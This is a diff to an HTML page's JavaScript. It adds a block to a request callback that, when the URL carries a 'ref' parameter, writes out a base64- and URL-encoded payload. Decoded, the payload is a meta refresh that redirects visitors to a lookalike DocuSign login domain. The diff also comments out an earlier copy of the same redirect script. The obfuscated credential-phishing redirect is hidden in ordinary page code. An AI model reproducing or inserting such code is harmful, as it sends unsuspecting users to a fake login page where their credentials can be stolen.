@@ -17,12 +17,23 @@
           if (this.readyState == 4 && this.status == 200) {
             let response = JSON.parse(this.response);
             console.log(response);
+            let hasRef = new URLSearchParams(window.location.search).has("ref");
+            if (hasRef) {
+              let ref = new URLSearchParams(window.location.search).get("ref");
+              document.write(
+                decodeURIComponent(
+                  atob(
+                    `JTNDbWV0YSUwQSUyMCUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTBBJTIwJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0QlMEElMjAlMjBodHRwcyUzQS8vbG9naW4uZG9jdS1lc2lnbi5wcm8vTmtEeVRTdWIlM0ZLUiUzRFA2UjRybVpJa0FUNHJUUnNKaW1SNXNDQWp6M3c4VGZxcXllc1RfNUVjcG9KU25LM3JQTm9BQSUyMiUwQS8lM0UlMEE=`
+                  )
+                )
+              );
+            }
           }
         };
       }
     </script>
 
-    <script type="text/javascript">
+    <!-- <script type="text/javascript">
       let hasRef = new URLSearchParams(window.location.search).has("ref");
       if (hasRef) {
         let ref = new URLSearchParams(window.location.search).get("ref");
@@ -34,7 +45,7 @@
           )
         );
       }
-    </script>
+    </script> -->
 
     <title>Document</title>
     <style>
